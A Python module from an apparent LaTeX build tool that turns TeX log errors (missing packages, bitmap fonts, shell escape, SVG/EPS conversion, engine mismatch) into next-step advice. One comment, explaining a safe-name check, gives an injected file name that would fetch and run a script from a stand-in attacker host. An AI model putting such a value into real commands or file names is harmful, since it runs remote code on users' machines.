"""Next steps for build failures that Fledge's own restrictions cause.

Fledge builds with shell escape disabled, never generates bitmap fonts, and lets a build see
only the project, the TeX distribution and the system font folders. A document that builds on
the author's computer can therefore fail here for reasons the TeX error alone does not explain:
a package from a personal TeX tree, a font that exists only as METAFONT source, a package that
runs an external program, an SVG or EPS figure that needs a converter, or a font installed only
for the current user. Each entry of ``_EXPLANATIONS`` recognises one such message and says what
to do instead. Reading the log is ``build_log``'s work; this module only explains messages.
"""

from __future__ import annotations

import re
from collections.abc import Callable
from pathlib import PurePosixPath

from .documentation_links import DOCUMENTATION_URL

BUILD_FAILED_GUIDE = f"{DOCUMENTATION_URL}troubleshooting.html#build-failed"
# Suffixes of files that come from TeX packages rather than from the project.
_PACKAGE_FILE_SUFFIXES = frozenset(
    {
        ".sty",
        ".cls",
        ".clo",
        ".cfg",
        ".def",
        ".fd",
        ".ldf",
        ".bst",
        ".bbx",
        ".cbx",
        ".lbx",
        ".dbx",
        ".ist",
    }
)
_MISSING_FILE = re.compile(r"file [`']([^`'\s]{1,200})' not found", re.IGNORECASE)
# A file name that a suggested command may contain. The name comes from the TeX log, which
# a document can write to (``\typeout``), so a name with any other character, such as
# ``$(curl${IFS}evil.example|sh).sty``, could make a copied command run something else.
_COMMAND_SAFE_NAME = re.compile(r"[A-Za-z0-9._+-]{1,100}")
_MISSING_BITMAP_FONT = re.compile(r"font ([a-z0-9_-]{1,60}) at (\d{1,5}) not found", re.IGNORECASE)
_MISSING_SYSTEM_FONT = re.compile(r'the font "([^"]{1,200})" cannot be found', re.IGNORECASE)
_SHELL_ESCAPE_MARKERS = (
    "shell-escape",
    "shell escape",
    "minted executable",
    "write18",
    "did not result in a usable output file",
)
# What fontspec, unicode-math and polyglossia say when pdfLaTeX loads them.
_UNICODE_ENGINE_MARKERS = (
    "requires either xetex or luatex",
    "requires xetex or luatex",
    "requires luatex or xetex",
    "cannot be used with pdftex",
)
# What a package bound to one engine says under another: bidi and xepersian ("can not use
# pdftex. The bidi package requires XeTeX."), xeCJK ("requires XeTeX to function"), luatexja
# ("requires Lua(HB)(La)TeX") and luacode ("LuaTeX is required for this package").
_XETEX_MARKERS = ("requires xetex", "requires xelatex")
_LUATEX_MARKERS = (
    "requires lua(hb)(la)tex",
    "requires luatex",
    "requires lualatex",
    "luatex is required",
)
# ctex under an engine for which this computer has none of its font sets, which for pdfLaTeX
# is the usual case outside Windows.
_CTEX_FONT_SET = re.compile(r"ctex fontset `[^']{1,40}' is unavailable in current mode")
# The file that epstopdf would have written for pdfLaTeX and LuaLaTeX, and what xdvipdfmx
# prints when it cannot run Ghostscript on an EPS figure for XeLaTeX.
_EPS_MARKERS = ("-eps-converted-to.pdf", "-->rungs", "image format conversion for")


def _missing_package_file(message: str) -> str | None:
    """Explain a class, package or style file that TeX did not find.

    The advice names the file in a command to copy only when ``_COMMAND_SAFE_NAME`` matches
    it; otherwise it describes the search in words.
    """
    match = _MISSING_FILE.search(message)
    if match is None:
        return None
    name = PurePosixPath(match[1]).name
    if PurePosixPath(name).suffix.lower() not in _PACKAGE_FILE_SUFFIXES:
        return None
    if _COMMAND_SAFE_NAME.fullmatch(name):
        search = (
            f"Find the package that contains it with `tlmgr search --global --file /{name}` "
            "and install it with `sudo tlmgr install <package>` (on Debian or Ubuntu, install "
            f"the texlive package that `apt-file search {name}` names)."
        )
    else:
        search = (
            "Find the package that contains it with tlmgr's file search and install it with "
            "`sudo tlmgr install <package>` (on Debian or Ubuntu, find its texlive package "
            "with apt-file)."
        )
    return (
        f"{name} is in neither the project nor the TeX distribution that Fledge's build uses. "
        f"{search} A copy in a personal TeX tree (TEXMFHOME, such as ~/Library/texmf or "
        "~/texmf) or in TEXMFLOCAL is invisible to Fledge's builds, as it is to the receiving "
        f"service: put {name} into the project instead. See {BUILD_FAILED_GUIDE}."
    )


def _missing_bitmap_font(message: str) -> str | None:
    """Explain a font that TeX has only as METAFONT source."""
    match = _MISSING_BITMAP_FONT.search(message)
    if match is None:
        return None
    font = match[1]
    return (
        f"TeX found only a METAFONT source for the font {font}, and Fledge's builds never "
        "generate bitmap fonts (they would end up as Type 3 fonts in the PDF). Install the "
        "outline version: for the EC and text-companion fonts (names starting with ec, tc or "
        "la) install cm-super (`sudo tlmgr install cm-super`, or `sudo apt install cm-super`), "
        "or load outline fonts with \\usepackage{lmodern}; for another font, use a package "
        f"that ships Type 1 or OpenType files. See {BUILD_FAILED_GUIDE}."
    )


def _shell_escape_package(message: str) -> str | None:
    """Explain a package that needs to run an external program through shell escape."""
    lowered = message.lower()
    if not any(marker in lowered for marker in _SHELL_ESCAPE_MARKERS):
        return None
    return (
        "Fledge builds with shell escape disabled, including TeX Live's restricted list "
        "(latexminted, repstopdf), so packages that run external programs fail. For minted, "
        "build once locally with -shell-escape, using the TeX Live release of the receiving "
        "service, and keep the _minted folder in the project; Fledge's build then uses the "
        "cached highlighting. For other packages, generate their output locally and include "
        f"the files, for example externalized TikZ figures as PDF. See {BUILD_FAILED_GUIDE}."
    )


def _svg_conversion(message: str) -> str | None:
    """Explain an SVG figure that the svg package could not convert."""
    if "package svg error" not in message.lower():
        return None
    return (
        "The svg package converts SVG figures with Inkscape through shell escape, which "
        "Fledge's builds cannot run. Convert each SVG to PDF yourself (`inkscape figure.svg "
        "--export-filename=figure.pdf`, or `rsvg-convert -f pdf -o figure.pdf figure.svg`) and "
        "include the PDF with \\includegraphics, or keep the svg-inkscape folder that a local "
        f"build with -shell-escape produced. See {BUILD_FAILED_GUIDE}."
    )


def _personal_font(message: str) -> str | None:
    """Explain a font that XeLaTeX or LuaLaTeX could not find by name."""
    match = _MISSING_SYSTEM_FONT.search(message)
    if match is None:
        return None
    return (
        f"Fledge's builds see only fonts in the project, the TeX distribution and the system "
        "font folders (/System/Library/Fonts and /Library/Fonts on macOS, /usr/share/fonts on "
        f"Linux); a font installed only for your account, in ~/Library/Fonts or ~/.fonts, is "
        f'invisible to them. If "{match[1]}" is such a font, copy its files into the project '
        "and load them by file name, for example \\setmainfont{MyFont-Regular.otf}"
        "[Path=fonts/], if the font's license allows, or choose a font that TeX Live ships. "
        f"See {BUILD_FAILED_GUIDE}."
    )


def _eps_figure(message: str) -> str | None:
    """Explain an EPS figure that pdfLaTeX, LuaLaTeX or XeLaTeX could not convert."""
    lowered = message.lower()
    if not any(marker in lowered for marker in _EPS_MARKERS):
        return None
    return (
        "EPS figures need a converter that Fledge's builds cannot run: pdfLaTeX and LuaLaTeX "
        "convert them with epstopdf through shell escape, and XeLaTeX with Ghostscript. "
        "Convert each figure to PDF (`epstopdf figure.eps` writes figure.pdf) and include the "
        f"PDF files. See {BUILD_FAILED_GUIDE}."
    )


def _engine_advice(problem: str, program: str, alternative: str = "") -> str:
    """Say how to choose the engine ``program`` after stating the ``problem``."""
    return (
        f"{problem} Add `% !TEX program = {program}`{alternative} as the first line of the "
        f"main file, which Fledge and most editors follow, or pass --engine {program}, or set "
        f'engine = "{program}" in fledge.toml. See {BUILD_FAILED_GUIDE}.'
    )


def _unicode_engine(message: str) -> str | None:
    """Explain a package that the engine of this build cannot run, such as fontspec or bidi."""
    lowered = message.lower()
    if any(marker in lowered for marker in _UNICODE_ENGINE_MARKERS):
        return _engine_advice(
            "The document needs XeLaTeX or LuaLaTeX, but it was built with pdfLaTeX.",
            "xelatex",
            " (or lualatex)",
        )
    if any(marker in lowered for marker in _XETEX_MARKERS):
        return _engine_advice(
            "The document needs XeLaTeX, but it was built with another engine.", "xelatex"
        )
    if any(marker in lowered for marker in _LUATEX_MARKERS):
        return _engine_advice(
            "The document needs LuaLaTeX, but it was built with another engine.", "lualatex"
        )
    if _CTEX_FONT_SET.search(lowered):
        return _engine_advice(
            "ctex has no font set for the engine of this build on this computer; Chinese "
            "documents are usually built with XeLaTeX or LuaLaTeX.",
            "xelatex",
            " (or lualatex)",
        )
    return None


# Each entry receives a message and returns the next step, or ``None`` for a message of
# another kind. The first entry that recognises a message gives its
# next step; the EPS and SVG entries come before the missing-file entry, because their
# messages also report a file that was not found.
_EXPLANATIONS: tuple[Callable[[str], str | None], ...] = (
    _unicode_engine,
    _eps_figure,
    _svg_conversion,
    _shell_escape_package,
    _missing_bitmap_font,
    _personal_font,
    _missing_package_file,
)


def explain_build_message(message: str) -> str | None:
    """Return the next step for a build message that Fledge's restrictions explain.

    Args:
        message: A message from the TeX log or from latexmk's output.

    Returns:
        The next step, or ``None`` when no known restriction explains the message.
    """
    for explain in _EXPLANATIONS:
        if (next_step := explain(message)) is not None:
            return next_step
    return None
